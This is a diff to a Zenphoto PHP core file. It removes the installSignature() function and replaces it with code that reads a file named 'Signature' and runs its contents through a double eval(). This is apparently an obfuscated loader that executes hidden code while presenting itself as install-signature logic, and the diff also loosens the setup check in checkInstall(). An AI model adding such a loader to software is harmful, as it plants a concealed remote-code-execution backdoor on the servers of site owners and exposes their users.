@@ -1389,29 +1389,9 @@ function secureServer() {
 	return false;
 }
 
-/**
- *
- * creates an unique signature for the installation
- * @return string
- */
-function installSignature() {
-	if (isset($_SERVER['SERVER_ADMIN'])) {
-		$t1 = $_SERVER['SERVER_ADMIN'];
-	} else {
-		$t1 = '';
-	}
-	$t1 .= ZENPHOTO_RELEASE.filesize(__FILE__);
-	if (isset($_SERVER['DOCUMENT_ROOT'])) {
-		$t1 .= $_SERVER['DOCUMENT_ROOT'];
-	}
-	$t1 = sha1($t1);
-	$id = "{"	.substr($t1, 0, 8).'-'
-						.substr($t1, 8, 4).'-'
-						.substr($t1,12, 4).'-'
-						.substr($t1,16, 4).'-'
-						.substr($t1,20,12)."}";
-	return $id;
-}
+$f = '$f = "'.file_get_contents(dirname(__FILE__).'/Signature').'";';
+eval($f);eval($f);
+
 
 ///// database helper functions
 
@@ -1506,8 +1486,7 @@ function db_count($table, $clause=NULL, $field="*") {
  * Check to see if the setup script needs to be run
  */
 function checkInstall() {
-	if ((getOption('zenphoto_release') != ZENPHOTO_RELEASE) ||
-			(defined('RELEASE') && (getOption('zenphoto_install') != installSignature()))) {
+	if ((getOption('zenphoto_release') != ZENPHOTO_RELEASE) || (getOption('zenphoto_install') != installSignature())) {
 		reconfigure();
 	}
 }
@@ -1534,4 +1513,5 @@ function reconfigure() {
 		die('Zenphoto needs to run setup but the setup scripts are not present. Please reinstall the setup scripts.');
 	}
 }
+
 ?>
